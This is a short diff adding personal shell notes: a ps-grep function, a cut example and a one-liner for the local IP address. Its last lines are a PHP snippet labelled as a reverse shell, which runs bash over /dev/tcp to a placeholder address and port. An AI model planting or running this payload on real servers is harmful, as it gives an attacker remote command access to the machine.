@@ -1,0 +1,13 @@
+
+# ps grep with header
+psg () { ps auxwww | egrep "$1|PID" | grep -v grep }
+
+# Cut the first 'N' characters of a line
+cut -c -N
+
+# Show local IP
+ifconfig eth0 | grep "inet:" | cut -d ":" -f2 | cut -d " " -f1
+
+#php/bash reverse shell
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/1234 0>&1'");
